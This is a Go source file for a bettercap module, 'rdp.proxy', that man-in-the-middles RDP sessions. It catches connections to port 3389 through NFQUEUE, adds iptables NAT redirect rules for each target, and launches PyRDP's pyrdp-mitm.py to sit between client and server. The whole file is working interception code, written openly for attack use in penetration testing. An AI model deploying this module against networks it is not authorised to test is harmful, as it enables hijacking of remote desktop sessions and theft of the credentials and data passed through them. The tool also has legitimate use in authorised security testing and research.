package rdp_proxy

import (
    "fmt"
    "os/exec"
    "io/ioutil"
    golog "log"
    "syscall"

    "github.com/bettercap/bettercap/core"
    "github.com/bettercap/bettercap/session"

    "github.com/chifflier/nfqueue-go/nfqueue"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"

    // "github.com/evilsocket/islazy/fs"
    // "github.com/evilsocket/islazy/tui"
)

type RdpProxy struct {
    session.SessionModule
    done       chan bool
    queue      *nfqueue.Queue
    queueNum   int
    port       int
    startPort  int
    cmd        string
    active     map[string]exec.Cmd
}

var mod *RdpProxy

func NewRdpProxy(s *session.Session) *RdpProxy {
    mod = &RdpProxy{
        SessionModule: session.NewSessionModule("rdp.proxy", s),
        done:          make(chan bool),
        queue:         nil,
        queueNum:      0,
        port:          3389,
        startPort:     40000,
        cmd:           "pyrdp-mitm.py",
        active:        make(map[string]exec.Cmd),
    }

    mod.AddHandler(session.NewModuleHandler("rdp.proxy on", "", "Start the RDP proxy.",
        func(args []string) error {
            return mod.Start()
        }))

    mod.AddHandler(session.NewModuleHandler("rdp.proxy off", "", "Stop the RDP proxy.",
        func(args []string) error {
            return mod.Stop()
        }))

    mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num",  "0",              "NFQUEUE number to bind to."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.port",       "3389",           "RDP port to intercept."))
    mod.AddParam(session.NewIntParameter("rdp.proxy.start",      "40000",          "Starting port for pyrdp sessionss"))
    mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py",  "", "The PyRDP base command to launch the man-in-the-middle."))
    mod.AddParam(session.NewStringParameter("rdp.proxy.out",     "./",             "", "The output directory for PyRDP artifcats."))
    return mod
}

func (mod RdpProxy) Name() string {
    return "rdp.proxy"
}

func (mod RdpProxy) Description() string {
    return "A Linux-only module that relies on NFQUEUEs and PyRDP in order to man-in-the-middle RDP sessions."
}

func (mod RdpProxy) Author() string {
    return "Alexandre Beaulieu <alex@segfault.me>"
}

func (mod *RdpProxy) destroyQueue() {
    if mod.queue == nil {
        return
    }

    mod.queue.DestroyQueue()
    mod.queue.Close()
    mod.queue = nil
}

// Adds the firewall rule for proxy instance.
func (mod *RdpProxy) doProxy(addr string, port string, enable bool) (err error) {
    _, err = core.Exec("iptables", []string { "-t", "nat",
        "-I",  "BCAPRDP", "1",
        "-d", addr,
        "-p", "tcp",
        "--dport", fmt.Sprintf("%d", mod.port),
        "-j", "REDIRECT",
        "--to-ports", port,
    })
    return
}

func (mod *RdpProxy) configureFirewall(enable bool) (err error) {
    rules := [][]string{}

    if enable {
        rules = [][]string{
            { "-t", "nat", "-N", "BCAPRDP" },
            { "-t", "nat", "-I", "PREROUTING", "1", "-j", "BCAPRDP" },
            { "-t", "nat", "-A", "BCAPRDP",
                "-p", "tcp", "-m", "tcp", "--dport", fmt.Sprintf("%d", mod.port),
                "-j", "NFQUEUE", "--queue-num", "0", "--queue-bypass",
            },
        }
    } else if !enable {
        rules = [][]string{
            { "-t", "nat", "-D", "PREROUTING", "-j", "BCAPRDP" },
            { "-t", "nat", "-F", "BCAPRDP" },
            { "-t", "nat", "-X", "BCAPRDP" },
        }
    }

    for _, rule := range rules {
        if _, err = core.Exec("iptables", rule); err != nil {
            return err
        }
    }

    return
}

func (mod *RdpProxy) Configure() (err error) {
    golog.SetOutput(ioutil.Discard)
    mod.destroyQueue()

    // TODO: Param validation and hydration
    if err, mod.port = mod.IntParam("rdp.proxy.port"); err != nil {
        return
    } else if err, mod.cmd = mod.StringParam("rdp.proxy.command"); err != nil {
        return
    } else if err, mod.queueNum = mod.IntParam("rdp.proxy.queue.num"); err != nil {
        return
    } else if _, err = exec.LookPath(mod.cmd); err != nil {
        return
    }

    mod.Info("Starting RDP Proxy")

    // Create the NFQUEUE handler.
    mod.queue = new(nfqueue.Queue)
    if err = mod.queue.SetCallback(OnRDPConnection); err != nil {
        return
    } else if err = mod.queue.Init(); err != nil {
        return
    } else if err = mod.queue.Unbind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.Bind(syscall.AF_INET); err != nil {
        return
    } else if err = mod.queue.CreateQueue(mod.queueNum); err != nil {
        return
    } else if err = mod.queue.SetMode(nfqueue.NFQNL_COPY_PACKET); err != nil {
        return
    } else if err = mod.configureFirewall(true); err != nil {
        return
    }
    return nil
}

// Note: It is probably a good idea to verify whether this call is serialized.
func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
    // 1. Determine source and target addresses.
    p := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
    src, sport := p.NetworkLayer().NetworkFlow().Src(), p.TransportLayer().TransportFlow().Src()
    dst, dport := p.NetworkLayer().NetworkFlow().Dst(), p.TransportLayer().TransportFlow().Dst()

    // TODO: Don't log here and connect a pipe to the process instead.
    mod.Info("CONNECT [%s:%v -> %v:%v]", src, sport, dst, dport)
    target := fmt.Sprintf("%v:%v", dst, dport)

    // 2. Check if the destination IP already has a PYRDP session active, if so, do nothing.
    if _, ok :=  mod.active[target]; !ok {
        // 3.1. Otherwise, create a proxy agent and firewall rules.
        args := []string{
            "-l", fmt.Sprintf("%d", mod.startPort),
            // "-o", mod.outpath,
            // "-i", "-d"
            target,
        }

        //   3.2. Spawn pyrdp proxy instance
        cmd := exec.Command(mod.cmd, args...)
        // _stderr, _ := cmd.StderrPipe()
        if err := cmd.Start(); err != nil {
            // XXX: Failed to start the rdp proxy... accept connection transparently and log?
        }

        //   3.3. Add a NAT rule in the firewall for this particular target IP
        mod.doProxy(dst.String(), fmt.Sprintf("%d", mod.startPort), true)
        mod.active[target] = *cmd
        mod.startPort += 1
    }

    // Force a retransmit to trigger the new firewall rules. (TODO: Find a more efficient way to do this.)
    payload.SetVerdict(nfqueue.NF_DROP)
    return 0
}

// NFQUEUE needs a raw function.
func OnRDPConnection(payload *nfqueue.Payload) int {
    return mod.handleRdpConnection(payload)
}

func (mod *RdpProxy) Start() error {
    if mod.Running() {
        return session.ErrAlreadyStarted(mod.Name())
    } else if err := mod.Configure(); err != nil {
        return err
    }

    return mod.SetRunning(true, func() {
        mod.Info("started on queue number %d", mod.queueNum)

        defer mod.destroyQueue()

        mod.queue.Loop()

        mod.done <- true
    })
}

func (mod *RdpProxy) Stop() error {
    mod.Info("Stopping!")
    return mod.SetRunning(false, func() {
        mod.queue.StopLoop()
        mod.configureFirewall(false)
        <-mod.done
    })
}
